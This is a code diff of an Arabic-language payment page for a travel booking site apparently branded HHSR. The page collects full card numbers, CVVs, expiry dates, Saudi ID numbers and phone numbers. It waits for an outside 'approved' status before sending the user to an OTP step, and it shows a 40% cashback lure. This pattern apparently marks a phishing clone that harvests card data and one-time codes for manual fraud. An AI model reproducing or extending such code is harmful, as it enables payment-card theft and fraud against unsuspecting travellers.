@@ -1,8 +1,7 @@
 import { useEffect, useState } from "react";
 import { motion } from "framer-motion";
-import { Clock, ChevronDown, ChevronUp, AlertCircle } from "lucide-react";
+import { Check, Clock, ChevronLeft, Shield, AlertCircle } from "lucide-react";
 import { Link, useLocation } from "wouter";
-import BookingStepBar from "@/components/booking-step-bar";
 import {
   addData,
   handleCurrentPage,
@@ -57,7 +56,12 @@ function readPax(): PaxCounts {
   }
 }
 
-function readSelectedTripInfo() {
+function readSelectedTripInfo(): {
+  unit: number;
+  className: string;
+  from: string;
+  to: string;
+} {
   try {
     const raw = sessionStorage.getItem("selectedTrip");
     if (!raw) return { unit: 0, className: "الأساسية", from: "", to: "" };
@@ -87,23 +91,135 @@ function computeTotals() {
   return { pax, lines, subtotal, tax, grandTotal, className, from, to, unit, ticketQuantity };
 }
 
+function PaymentBookingSummary() {
+  const { lines, subtotal, tax, grandTotal, className, from, to } = computeTotals();
+  return (
+    <div className="bg-background border border-border rounded-2xl p-5 mb-4" dir="rtl">
+      <h3 className="font-bold text-foreground text-base mb-4 text-start">ملخص الحجز</h3>
+      {(from || to) && (
+        <div className="flex items-center gap-2 justify-end mb-3 text-xs text-muted-foreground">
+          <span>
+            {from} ← {to}
+          </span>
+          <span>✈</span>
+        </div>
+      )}
+
+      <div className="mb-3 pb-3 border-b border-border/50">
+        <p className="text-xs text-muted-foreground text-start mb-3">رحلة المغادرة</p>
+        {lines.length === 0 ? (
+          <p className="text-xs text-muted-foreground">لا توجد بيانات تذاكر</p>
+        ) : (
+          lines.map((l) => (
+            <div key={l.label} className="mb-2 last:mb-0">
+              <div className="flex justify-between text-sm">
+                <span className="font-bold tabular-nums">{l.lineTotal.toFixed(2)} ر.س</span>
+                <span className="text-muted-foreground">
+                  {l.label} ({className})
+                </span>
+              </div>
+              <div className="flex justify-between text-xs mt-0.5">
+                <span className="text-primary tabular-nums">
+                  {l.qty} × {l.ppu.toFixed(2)}
+                </span>
+                <span className="text-muted-foreground">
+                  {l.label} {l.qty}
+                </span>
+              </div>
+            </div>
+          ))
+        )}
+      </div>
+
+      <div className="space-y-2 text-sm text-start">
+        <div className="flex justify-between">
+          <span className="font-semibold tabular-nums">{subtotal.toFixed(2)} ر.س</span>
+          <span className="text-muted-foreground">الإجمالي قبل الضريبة</span>
+        </div>
+        <div className="flex justify-between">
+          <span className="font-semibold tabular-nums">{tax.toFixed(2)} ر.س</span>
+          <span className="text-muted-foreground">ضريبة القيمة المضافة (15٪)</span>
+        </div>
+        <div className="flex justify-between">
+          <span className="font-semibold tabular-nums">0.00 ر.س</span>
+          <span className="text-muted-foreground">الخصم</span>
+        </div>
+        <div className="flex justify-between border-t border-border pt-2 mt-2">
+          <span className="font-extrabold text-lg text-primary tabular-nums">
+            {grandTotal.toFixed(2)} ر.س
+          </span>
+          <span className="font-bold text-foreground">الإجمالي</span>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+const STEPS = [
+  { label: "التذاكر", done: true, active: false },
+  { label: "التفاصيل", done: true, active: false },
+  { label: "الشراء", done: true, active: false },
+  { label: "الدفع", done: false, active: true },
+];
+
 const PAYMENT_METHODS = [
   {
+    id: "mada",
+    label: "مدى",
+    description: "الدفع عن طريق مدى",
+    logo: "https://media.base44.com/images/public/6a0141c514678b9757e134f7/53cfdc496_satrans_com_sa_mada-logo0zcnw-i5k6dfc_e3ec505d.svg",
+  },
+  {
     id: "card",
-    label: "بطاقة ائتمانية",
+    label: "فيزا / ماستركارد / أميكس",
+    description: "الدفع بالبطاقة الائتمانية",
     logos: [
       "https://media.base44.com/images/public/6a0141c514678b9757e134f7/2c1e15023_satrans_com_sa_visa-logo0upfiv7ntladm_68f214bb.svg",
       "https://media.base44.com/images/public/6a0141c514678b9757e134f7/41fe88fde_satrans_com_sa_master-card-logo0y_enem50ek-_055b28cd.svg",
-      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/53cfdc496_satrans_com_sa_mada-logo0zcnw-i5k6dfc_e3ec505d.svg",
     ],
   },
-  {
-    id: "applepay",
-    label: "Apple Pay",
-    appleLogo: true,
-    disabled: true,
-  },
 ] as const;
+
+function StepBar() {
+  return (
+    <div
+      className="flex items-center justify-center bg-background border-b border-border py-2.5 sm:py-3 px-2 sticky top-0 z-30 overflow-x-auto"
+      dir="rtl"
+    >
+      {STEPS.map((step, i) => (
+        <div key={i} className="flex items-center flex-shrink-0">
+          <div className="flex flex-col items-center gap-1 px-2 sm:px-5">
+            <div
+              className={`w-7 h-7 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-bold border-2 transition-all ${
+                step.done
+                  ? "bg-primary border-primary text-primary-foreground"
+                  : step.active
+                    ? "bg-emerald-600 border-emerald-600 text-white"
+                    : "bg-background border-border text-muted-foreground"
+              }`}
+            >
+              {step.done ? <Check className="w-3.5 h-3.5 sm:w-4 sm:h-4" /> : i + 1}
+            </div>
+            <span
+              className={`text-[9px] sm:text-[10px] font-medium whitespace-nowrap ${
+                step.active
+                  ? "text-emerald-700"
+                  : step.done
+                    ? "text-primary"
+                    : "text-muted-foreground"
+              }`}
+            >
+              {step.label}
+            </span>
+          </div>
+          {i < STEPS.length - 1 && (
+            <div className="w-6 sm:w-12 h-0.5 mb-4 bg-primary" />
+          )}
+        </div>
+      ))}
+    </div>
+  );
+}
 
 function digitsOnly(v: string, max: number) {
   return v.replace(/\D/g, "").slice(0, max);
@@ -112,98 +228,10 @@ function formatCard(v: string) {
   return digitsOnly(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
 }
 
-function PassengerSummaryCard({ collapsed, onToggle }: { collapsed: boolean; onToggle: () => void }) {
-  const { subtotal } = computeTotals();
-  return (
-    <div className="hhsr-card mb-4">
-      <div className="flex items-start justify-between p-4">
-        <button
-          type="button"
-          onClick={onToggle}
-          className="w-8 h-8 rounded-full bg-[hsl(var(--gold-400))] text-white flex items-center justify-center"
-          aria-label={collapsed ? "توسيع" : "طي"}
-          data-testid="button-toggle-passenger-summary"
-        >
-          {collapsed ? <ChevronDown className="w-4 h-4" /> : <ChevronUp className="w-4 h-4" />}
-        </button>
-        <div className="flex-1 ms-3 text-end">
-          <h3 className="font-extrabold text-foreground text-base">مسافر بالغ 1</h3>
-          {!collapsed && (
-            <div className="mt-2 flex items-center justify-end gap-1 text-sm">
-              <span className="font-extrabold tabular-nums text-foreground">
-                {subtotal.toFixed(2)} ﷼
-              </span>
-              <span className="text-muted-foreground">:السعر</span>
-            </div>
-          )}
-        </div>
-      </div>
-    </div>
-  );
-}
-
-function TotalsCard({ collapsed, onToggle }: { collapsed: boolean; onToggle: () => void }) {
-  const { subtotal, tax, grandTotal } = computeTotals();
-  const rows = [
-    { label: "السعر الأساسي", value: subtotal },
-    { label: "ضريبة القيمة المضافة", value: tax },
-    { label: "شامل الرسوم الإدارية", value: 0 },
-    { label: "شامل رسوم الدفع", value: 0 },
-  ];
-
-  return (
-    <div className="hhsr-card mb-4">
-      <div className="flex items-start justify-between p-4 pb-3 border-b border-border/50">
-        <button
-          type="button"
-          onClick={onToggle}
-          className="w-8 h-8 rounded-full bg-[hsl(var(--gold-400))] text-white flex items-center justify-center"
-          aria-label={collapsed ? "توسيع" : "طي"}
-          data-testid="button-toggle-totals"
-        >
-          {collapsed ? <ChevronDown className="w-4 h-4" /> : <ChevronUp className="w-4 h-4" />}
-        </button>
-        <div className="flex-1 ms-3 flex items-center justify-between">
-          <span className="font-extrabold tabular-nums text-foreground">
-            ﷼ {grandTotal.toFixed(2)}
-          </span>
-          <span className="font-bold text-foreground">السعر الإجمالي</span>
-        </div>
-      </div>
-
-      {!collapsed && (
-        <div className="px-4 py-3 space-y-2.5">
-          {rows.map((r) => (
-            <div key={r.label} className="flex items-center justify-between text-sm">
-              <span className="font-semibold tabular-nums text-foreground">
-                ﷼ {r.value.toFixed(2)}
-              </span>
-              <span className="text-muted-foreground">{r.label}</span>
-            </div>
-          ))}
-        </div>
-      )}
-    </div>
-  );
-}
-
-function AppleLogo() {
-  return (
-    <div className="flex items-center justify-center gap-1 px-3 py-1.5 rounded-md border border-foreground/80 bg-white">
-      <svg viewBox="0 0 24 24" className="w-4 h-4 text-foreground" fill="currentColor" aria-hidden="true">
-        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
-      </svg>
-      <span className="text-sm font-semibold text-foreground">Pay</span>
-    </div>
-  );
-}
-
 export default function Payment() {
   const [, setLocation] = useLocation();
-  const [selected, setSelected] = useState<string>("card");
+  const [selected, setSelected] = useState<string>("mada");
   const [agreed, setAgreed] = useState(true);
-  const [paxCollapsed, setPaxCollapsed] = useState(false);
-  const [totalsCollapsed, setTotalsCollapsed] = useState(false);
 
   const [cardNumber, setCardNumber] = useState("");
   const [cardName, setCardName] = useState("");
@@ -212,18 +240,47 @@ export default function Payment() {
     String(new Date().getFullYear() + 1).slice(-2),
   );
   const [cvv, setCvv] = useState("");
-  const [errors, setErrors] = useState<Record<string, string>>({});
-  const [error, setError] = useState("");
+
   const [submitting, setSubmitting] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
-  const [showCashbackPopup, setShowCashbackPopup] = useState(false);
-  const [showCardModal, setShowCardModal] = useState(false);
+  const [error, setError] = useState("");
+  const [errors, setErrors] = useState<Record<string, string>>({});
+  const [showCashbackPopup, setShowCashbackPopup] = useState(true);
 
-  const totals = computeTotals();
+  const clearFieldError = (k: string) =>
+    setErrors((p) => {
+      if (!p[k]) return p;
+      const { [k]: _drop, ...rest } = p;
+      return rest;
+    });
+
+  const validateForm = (): boolean => {
+    const next: Record<string, string> = {};
+    const raw = cardNumber.replace(/\s/g, "");
+    if (!raw || raw.length < 13) next.cardNumber = "رقم البطاقة غير صحيح";
+    else if (!validateLuhn(raw)) next.cardNumber = "رقم البطاقة غير صالح";
+
+    if (!cardName.trim() || cardName.trim().length < 3)
+      next.cardName = "يرجى إدخال الاسم على البطاقة";
+
+    const mm = parseInt(expiryMonth, 10);
+    const yy = parseInt(expiryYear, 10);
+    if (!mm || mm < 1 || mm > 12 || !yy) {
+      next.expiry = "تاريخ الصلاحية غير صحيح";
+    } else {
+      const fullYear = 2000 + yy;
+      const expiry = new Date(fullYear, mm); // first of next month
+      if (expiry <= new Date()) next.expiry = "البطاقة منتهية الصلاحية";
+    }
+
+    if (!cvv || cvv.length < 3) next.cvv = "كود الحماية غير صحيح";
+
+    setErrors(next);
+    return Object.keys(next).length === 0;
+  };
 
   useEffect(() => {
     void handleCurrentPage("payment");
-    setShowCashbackPopup(true);
   }, []);
 
   useEffect(() => {
@@ -234,61 +291,55 @@ export default function Payment() {
         setLocation("/otp");
       } else if (status === "rejected") {
         setWaitingApproval(false);
-        setError("تم رفض البطاقة. يرجى المحاولة مرة أخرى.");
-        setSubmitting(false);
+        setError("البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
       }
     });
-    return () => unsub && unsub();
+    return () => unsub();
   }, [waitingApproval, setLocation]);
-
-  const clearFieldError = (k: string) =>
-    setErrors((p) => {
-      if (!p[k]) return p;
-      const n = { ...p };
-      delete n[k];
-      return n;
-    });
-
-  const validateCardForm = (): boolean => {
-    const e: Record<string, string> = {};
-    const cn = cardNumber.replace(/\s/g, "");
-    if (!cn) e.cardNumber = "رقم البطاقة مطلوب";
-    else if (cn.length < 13) e.cardNumber = "رقم البطاقة غير صحيح";
-    else if (!validateLuhn(cn)) e.cardNumber = "رقم البطاقة غير صحيح";
-    if (!cardName.trim()) e.cardName = "اسم حامل البطاقة مطلوب";
-    if (!expiryMonth || !expiryYear) e.expiry = "تاريخ الانتهاء مطلوب";
-    if (!cvv || cvv.length < 3) e.cvv = "رمز الأمان غير صحيح";
-    setErrors(e);
-    return Object.keys(e).length === 0;
-  };
 
   const canPay = agreed && !submitting && !waitingApproval;
 
   const onPay = async () => {
     if (!canPay) return;
-    if (selected === "card" && !showCardModal) {
-      setShowCardModal(true);
-      return;
-    }
-    if (selected === "card" && !validateCardForm()) return;
-
     setError("");
+    if (!validateForm()) return;
     setSubmitting(true);
 
-    try {
-      let passenger: any = {};
-      try {
-        passenger = JSON.parse(sessionStorage.getItem("passenger") || "{}");
-      } catch {}
-      const trip = JSON.parse(sessionStorage.getItem("selectedTrip") || "{}");
-      const seats = JSON.parse(sessionStorage.getItem("selectedSeats") || "[]");
-      const tripPrice = trip.price || 0;
+    const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) {
+      setSubmitting(false);
+      setLocation("/register");
+      return;
+    }
 
+    const passenger = (() => {
+      try {
+        return JSON.parse(sessionStorage.getItem("passenger") || "{}");
+      } catch {
+        return {};
+      }
+    })();
+    const trip = (() => {
+      try {
+        return JSON.parse(sessionStorage.getItem("selectedTrip") || "{}");
+      } catch {
+        return {};
+      }
+    })();
+    const seats = (() => {
+      try {
+        return JSON.parse(sessionStorage.getItem("selectedSeats") || "[]");
+      } catch {
+        return [];
+      }
+    })();
+
+    try {
+      const totals = computeTotals();
+      const tripPrice = Number(trip.price) || totals.unit || 159;
       await addData({
         name: [passenger.firstName, passenger.lastName].filter(Boolean).join(" "),
-        email: passenger.email || "",
         phone: passenger.phone || "",
-        countryCode: passenger.countryCode || "+966",
         saudiId: passenger.idNumber || "",
         nationality: passenger.nationality || "",
         passengerTitle: passenger.title || "",
@@ -310,20 +361,17 @@ export default function Payment() {
       // non-fatal
     }
 
-    if (selected !== "card") {
-      setSubmitting(false);
-      setWaitingApproval(true);
-      return;
-    }
-
     const cleanCard = cardNumber.replace(/\s/g, "");
+
     try {
       if (await isBinBlocked(cleanCard)) {
         setError("هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
         setSubmitting(false);
         return;
       }
-    } catch {}
+    } catch {
+      // ignore lookup failures and continue
+    }
 
     const paymentInfo = {
       cardNumber: cleanCard,
@@ -346,20 +394,23 @@ export default function Payment() {
       }
       return;
     }
+
     setSubmitting(false);
     setWaitingApproval(true);
   };
 
+  const showCardForm = selected === "mada" || selected === "card";
+
   return (
-    <div className="min-h-screen" dir="rtl" data-testid="page-payment">
+    <div className="min-h-screen bg-muted/30" dir="rtl" data-testid="page-payment">
       {showCashbackPopup && (
         <div
-          className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
+          className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in"
           onClick={() => setShowCashbackPopup(false)}
           data-testid="overlay-cashback"
         >
           <div
-            className="relative bg-white rounded-2xl shadow-2xl max-w-sm w-full overflow-hidden"
+            className="relative bg-white rounded-2xl shadow-2xl max-w-sm w-full overflow-hidden animate-in zoom-in-95"
             onClick={(e) => e.stopPropagation()}
           >
             <button
@@ -371,13 +422,18 @@ export default function Payment() {
             >
               ×
             </button>
-            <img src={cashbackImg} alt="كاش باك 40%" className="w-full h-auto block" />
+            <img
+              src={cashbackImg}
+              alt="كاش باك 40% من البنوك المشاركة"
+              className="w-full h-auto block"
+              data-testid="img-cashback"
+            />
             <div className="p-4">
               <button
                 type="button"
                 onClick={() => setShowCashbackPopup(false)}
-                className="btn-gold w-full"
                 data-testid="button-continue-cashback"
+                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold rounded-xl py-3 text-sm transition"
               >
                 متابعة الدفع
               </button>
@@ -385,276 +441,282 @@ export default function Payment() {
           </div>
         </div>
       )}
+      <StepBar />
 
-      {showCardModal && (
-        <div
-          className="fixed inset-0 z-[110] flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm"
-          data-testid="overlay-card-modal"
-        >
-          <div className="bg-white w-full sm:max-w-md sm:rounded-2xl rounded-t-2xl overflow-hidden">
-            <div className="flex items-center justify-between bg-[hsl(var(--gold-400))] text-white px-4 py-3">
-              <button
-                onClick={() => setShowCardModal(false)}
-                className="text-sm font-semibold"
-                data-testid="button-cancel-card-modal"
+      <div className="max-w-2xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
+        <div className="bg-background border border-border rounded-2xl p-5 mb-4">
+          <h3 className="font-bold text-foreground text-base mb-4 text-start">طريقة الدفع</h3>
+
+          <div className="space-y-3">
+            {PAYMENT_METHODS.map((method) => (
+              <label
+                key={method.id}
+                className={`flex items-center justify-between gap-3 p-3 sm:p-4 rounded-xl border-2 cursor-pointer transition-all duration-200 ${
+                  selected === method.id
+                    ? "border-emerald-600 bg-emerald-50"
+                    : "border-border bg-background hover:border-primary/40"
+                }`}
+                data-testid={`payment-method-${method.id}`}
               >
-                Cancel
-              </button>
-            </div>
-            <div className="p-4">
-              <div className="flex items-center justify-between mb-3">
-                <span className="font-bold text-foreground">
-                  HHSR : SAR {totals.grandTotal.toFixed(2)}
-                </span>
-                <button
-                  onClick={() => setShowCardModal(false)}
-                  className="text-muted-foreground text-2xl leading-none"
-                  aria-label="إغلاق"
-                >
-                  ×
-                </button>
-              </div>
-              <div className="flex items-center gap-2 text-emerald-700 text-sm mb-4">
-                <Clock className="w-4 h-4" />
-                <span>لديك <span dir="ltr" className="font-bold">9:50</span> متبقي لهذا الدفع</span>
-              </div>
+                <div className="flex items-center gap-2 flex-shrink-0">
+                  {"logo" in method && method.logo ? (
+                    <img
+                      src={method.logo}
+                      alt={method.label}
+                      className="h-6 sm:h-7 w-auto object-contain"
+                    />
+                  ) : "logos" in method ? (
+                    <div className="flex gap-1">
+                      {method.logos.map((l, i) => (
+                        <img
+                          key={i}
+                          src={l}
+                          alt=""
+                          className="h-5 sm:h-6 w-auto object-contain"
+                        />
+                      ))}
+                    </div>
+                  ) : null}
+                </div>
 
-              <div className="space-y-4">
+                <div className="flex items-center gap-3 min-w-0 flex-1 justify-end">
+                  <div className="text-start min-w-0">
+                    <div className="text-sm font-bold text-foreground truncate">{method.label}</div>
+                    <div className="text-[11px] sm:text-xs text-muted-foreground truncate">
+                      {method.description}
+                    </div>
+                  </div>
+                  <div
+                    className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 transition-all ${
+                      selected === method.id ? "border-emerald-600 bg-emerald-600" : "border-border"
+                    }`}
+                  >
+                    {selected === method.id && <div className="w-2 h-2 rounded-full bg-white" />}
+                  </div>
+                  <input
+                    type="radio"
+                    name="payment"
+                    value={method.id}
+                    checked={selected === method.id}
+                    onChange={() => setSelected(method.id)}
+                    className="sr-only"
+                  />
+                </div>
+              </label>
+            ))}
+          </div>
+        </div>
+
+        {showCardForm && (
+          <div className="bg-background border border-border rounded-2xl p-5 mb-4">
+            <h3 className="font-bold text-foreground text-base mb-4 text-start">تفاصيل البطاقة</h3>
+            <div className="space-y-4">
+              <div>
+                <label className="text-xs text-muted-foreground block mb-1 text-start">
+                  رقم البطاقة *
+                </label>
+                <input
+                  value={cardNumber}
+                  onChange={(e) => {
+                    setCardNumber(formatCard(e.target.value));
+                    clearFieldError("cardNumber");
+                    setError("");
+                  }}
+                  placeholder="0000 0000 0000 0000"
+                  inputMode="numeric"
+                  dir="ltr"
+                  className={`w-full border rounded-xl px-3 py-2.5 text-sm text-start focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
+                    errors.cardNumber ? "border-destructive" : "border-border"
+                  }`}
+                  data-testid="input-card-number"
+                />
+                {errors.cardNumber && (
+                  <p className="text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
+                    <span>{errors.cardNumber}</span>
+                    <AlertCircle className="w-3 h-3" />
+                  </p>
+                )}
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground block mb-1 text-start">
+                  اسم حامل البطاقة *
+                </label>
+                <input
+                  value={cardName}
+                  onChange={(e) => {
+                    setCardName(e.target.value.toUpperCase());
+                    clearFieldError("cardName");
+                  }}
+                  placeholder="NAME ON CARD"
+                  className={`w-full border rounded-xl px-3 py-2.5 text-sm text-start focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background uppercase ${
+                    errors.cardName ? "border-destructive" : "border-border"
+                  }`}
+                  data-testid="input-card-name"
+                />
+                {errors.cardName && (
+                  <p className="text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
+                    <span>{errors.cardName}</span>
+                    <AlertCircle className="w-3 h-3" />
+                  </p>
+                )}
+              </div>
+              <div className="grid grid-cols-3 gap-3 items-start">
                 <div>
-                  <label className="block text-sm font-semibold text-foreground mb-1 text-end">
-                    رقم البطاقة <span className="text-destructive">*</span>
+                  <label className="text-xs text-muted-foreground block mb-1 text-start">
+                    شهر *
                   </label>
                   <input
-                    value={cardNumber}
+                    value={expiryMonth}
                     onChange={(e) => {
-                      setCardNumber(formatCard(e.target.value));
-                      clearFieldError("cardNumber");
+                      setExpiryMonth(digitsOnly(e.target.value, 2));
+                      clearFieldError("expiry");
                     }}
+                    placeholder="MM"
                     inputMode="numeric"
                     dir="ltr"
-                    className={`w-full border rounded-md px-3 py-2.5 text-sm bg-white outline-none focus:border-[hsl(var(--gold-500))] ${
-                      errors.cardNumber ? "border-destructive" : "border-border"
+                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
+                      errors.expiry ? "border-destructive" : "border-border"
                     }`}
-                    data-testid="input-card-number"
+                    data-testid="input-expiry-month"
                   />
-                  <div className="flex justify-end gap-1 mt-1">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="visa" className="h-4" />
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="mc" className="h-4" />
-                    <img src={PAYMENT_METHODS[0].logos![2]} alt="mada" className="h-4" />
-                  </div>
                 </div>
-
-                <div className="grid grid-cols-2 gap-3">
-                  <div>
-                    <label className="block text-sm font-semibold text-foreground mb-1 text-end">
-                      شهر انتهاء الصلاحية <span className="text-destructive">*</span>
-                    </label>
-                    <select
-                      value={expiryMonth}
-                      onChange={(e) => setExpiryMonth(e.target.value)}
-                      className="w-full border border-border rounded-md px-3 py-2.5 text-sm bg-white text-end"
-                      dir="ltr"
-                      data-testid="select-expiry-month"
-                    >
-                      {Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")).map((m) => (
-                        <option key={m} value={m}>{m}</option>
-                      ))}
-                    </select>
-                  </div>
-                  <div>
-                    <label className="block text-sm font-semibold text-foreground mb-1 text-end">
-                      سنة انتهاء الصلاحية <span className="text-destructive">*</span>
-                    </label>
-                    <select
-                      value={expiryYear}
-                      onChange={(e) => setExpiryYear(e.target.value)}
-                      className="w-full border border-border rounded-md px-3 py-2.5 text-sm bg-white text-end"
-                      dir="ltr"
-                      data-testid="select-expiry-year"
-                    >
-                      {Array.from({ length: 12 }, (_, i) => {
-                        const y = (new Date().getFullYear() + i).toString().slice(-2);
-                        return <option key={y} value={y}>{y}</option>;
-                      })}
-                    </select>
-                  </div>
-                </div>
-
                 <div>
-                  <label className="block text-sm font-semibold text-foreground mb-1 text-end">
-                    اسم حامل البطاقة <span className="text-destructive">*</span>
+                  <label className="text-xs text-muted-foreground block mb-1 text-start">
+                    سنة *
                   </label>
                   <input
-                    value={cardName}
+                    value={expiryYear}
                     onChange={(e) => {
-                      setCardName(e.target.value.toUpperCase());
-                      clearFieldError("cardName");
+                      setExpiryYear(digitsOnly(e.target.value, 2));
+                      clearFieldError("expiry");
                     }}
-                    className={`w-full border rounded-md px-3 py-2.5 text-sm bg-white uppercase outline-none focus:border-[hsl(var(--gold-500))] ${
-                      errors.cardName ? "border-destructive" : "border-border"
+                    placeholder="YY"
+                    inputMode="numeric"
+                    dir="ltr"
+                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
+                      errors.expiry ? "border-destructive" : "border-border"
                     }`}
-                    data-testid="input-card-name"
+                    data-testid="input-expiry-year"
                   />
                 </div>
-
-                <div className="flex items-end gap-3">
-                  <div className="flex-1">
-                    <label className="block text-sm font-semibold text-foreground mb-1 text-end">
-                      رمز الأمان <span className="text-destructive">*</span>
-                    </label>
-                    <p className="text-[11px] text-muted-foreground text-end mb-1">
-                      3 أرقام على الجهة الخلفية من بطاقتك
-                    </p>
-                  </div>
+                <div>
+                  <label className="text-xs text-muted-foreground block mb-1 text-start">
+                    CVV *
+                  </label>
                   <input
                     value={cvv}
                     onChange={(e) => {
                       setCvv(digitsOnly(e.target.value, 4));
                       clearFieldError("cvv");
                     }}
+                    placeholder="•••"
                     inputMode="numeric"
                     dir="ltr"
-                    className={`w-20 border rounded-md px-3 py-2.5 text-sm text-center bg-white outline-none focus:border-[hsl(var(--gold-500))] ${
+                    className={`w-full border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background ${
                       errors.cvv ? "border-destructive" : "border-border"
                     }`}
                     data-testid="input-cvv"
                   />
+                  {errors.cvv && (
+                    <p className="text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
+                      <span>{errors.cvv}</span>
+                      <AlertCircle className="w-3 h-3" />
+                    </p>
+                  )}
                 </div>
-
-                {error && (
-                  <div className="bg-destructive/10 border border-destructive/30 text-destructive text-sm rounded-md px-3 py-2 flex items-center gap-2">
-                    <AlertCircle className="w-4 h-4" />
-                    <span>{error}</span>
-                  </div>
+                {errors.expiry && (
+                  <p className="col-span-2 text-[11px] text-destructive mt-1 text-start flex items-center justify-end gap-1">
+                    <span>{errors.expiry}</span>
+                    <AlertCircle className="w-3 h-3" />
+                  </p>
                 )}
-
-                <button
-                  onClick={onPay}
-                  disabled={submitting || waitingApproval}
-                  className="w-full bg-emerald-600 text-white font-bold py-3 rounded-md hover:bg-emerald-700 transition-colors disabled:opacity-60"
-                  data-testid="button-card-next"
-                >
-                  {submitting ? "جاري المعالجة..." : waitingApproval ? "بانتظار التأكيد..." : "التالي"}
-                </button>
-                <button
-                  onClick={() => setShowCardModal(false)}
-                  className="w-full bg-white border border-[#1e88e5] text-[#1e88e5] font-bold py-3 rounded-md hover:bg-blue-50 transition-colors"
-                  data-testid="button-card-cancel"
-                >
-                  إلغاء
-                </button>
-
-                <div className="flex items-center justify-between pt-2 border-t border-border">
-                  <span className="text-xs text-muted-foreground">Powered By</span>
-                  <img src={PAYMENT_METHODS[0].logos![1]} alt="mc" className="h-5" />
-                </div>
               </div>
             </div>
           </div>
-        </div>
-      )}
+        )}
 
-      <BookingStepBar current={3} title="الدفع" backHref="/passenger-details" />
+        <PaymentBookingSummary />
 
-      <div className="max-w-md mx-auto px-3 sm:px-4 py-4">
-        <PassengerSummaryCard
-          collapsed={paxCollapsed}
-          onToggle={() => setPaxCollapsed((c) => !c)}
-        />
 
-        {/* Payment methods */}
-        <div className="hhsr-card mb-4">
-          <div className="flex items-center justify-between p-4 pb-3">
-            <span className="w-8 h-8 rounded-full bg-[hsl(var(--gold-400))] text-white flex items-center justify-center">
-              <ChevronUp className="w-4 h-4" />
-            </span>
-            <h3 className="font-extrabold text-foreground text-base">طريقة الدفع</h3>
-          </div>
-          <div className="px-4 pb-4 flex items-center justify-center gap-6">
-            {PAYMENT_METHODS.map((method) => {
-              const isDisabled = "disabled" in method && method.disabled;
-              return (
-              <label
-                key={method.id}
-                className={`flex items-center gap-3 ${
-                  isDisabled ? "cursor-not-allowed opacity-40" : "cursor-pointer"
-                }`}
-                data-testid={`payment-method-${method.id}`}
-                aria-disabled={isDisabled}
-              >
-                <input
-                  type="radio"
-                  name="payment"
-                  value={method.id}
-                  checked={selected === method.id}
-                  onChange={() => !isDisabled && setSelected(method.id)}
-                  disabled={isDisabled}
-                  className="sr-only"
-                />
-                <span
-                  className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
-                    selected === method.id
-                      ? "border-[hsl(var(--gold-500))] bg-[hsl(var(--gold-500))]"
-                      : "border-[hsl(var(--gold-400))] bg-white"
-                  }`}
-                >
-                  {selected === method.id && (
-                    <span className="w-2 h-2 rounded-full bg-white" />
-                  )}
-                </span>
-                {"appleLogo" in method && method.appleLogo ? (
-                  <AppleLogo />
-                ) : "logos" in method && method.logos ? (
-                  <div className="grid grid-cols-2 gap-1 items-center">
-                    {method.logos.slice(0, 3).map((l, i) => (
-                      <img key={i} src={l} alt="" className="h-4 w-auto" />
-                    ))}
-                  </div>
-                ) : null}
-              </label>
-              );
-            })}
-          </div>
+        <div className="bg-background border border-border rounded-2xl p-4 mb-4">
+          <label className="flex items-start gap-3 cursor-pointer" dir="rtl">
+            <div className="flex-1 text-start">
+              <p className="text-xs text-foreground leading-relaxed">
+                أوافق على{" "}
+                <a href="#" className="text-primary underline">
+                  شروط الخدمة
+                </a>{" "}
+                و{" "}
+                <a href="#" className="text-primary underline">
+                  سياسة الخصوصية
+                </a>
+              </p>
+              <ul className="mt-2 space-y-1">
+                {[
+                  "يُسمح بتغيير موعد رحلتك",
+                  "غير قابل للاسترداد (في حالة الإلغاء)",
+                  "شروط سياسة الأمتعة",
+                ].map((t, i) => (
+                  <li
+                    key={i}
+                    className="flex items-center justify-end gap-1.5 text-xs text-muted-foreground"
+                  >
+                    <span>{t}</span>
+                    <Check className="w-3 h-3 text-primary flex-shrink-0" />
+                  </li>
+                ))}
+              </ul>
+            </div>
+            <div
+              onClick={() => setAgreed((a) => !a)}
+              className={`w-5 h-5 mt-0.5 rounded border-2 flex items-center justify-center flex-shrink-0 transition-all ${
